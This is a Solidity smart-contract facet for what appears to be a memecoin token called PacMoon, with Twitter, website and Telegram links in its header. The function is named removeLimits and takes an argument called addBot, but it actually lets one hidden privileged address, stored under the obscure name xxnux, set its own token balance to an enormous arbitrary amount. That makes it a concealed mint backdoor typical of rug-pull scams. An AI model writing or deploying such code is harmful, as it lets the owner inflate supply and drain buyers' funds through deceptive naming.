/*  
   * SPDX-License-Identifier: MIT 

    // Twitter: https://twitter.com/pacmoon_
    // Website: https://pacmoon.io/
    // Telegram: https://t.me/PacMoon_PAC
   

*/
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
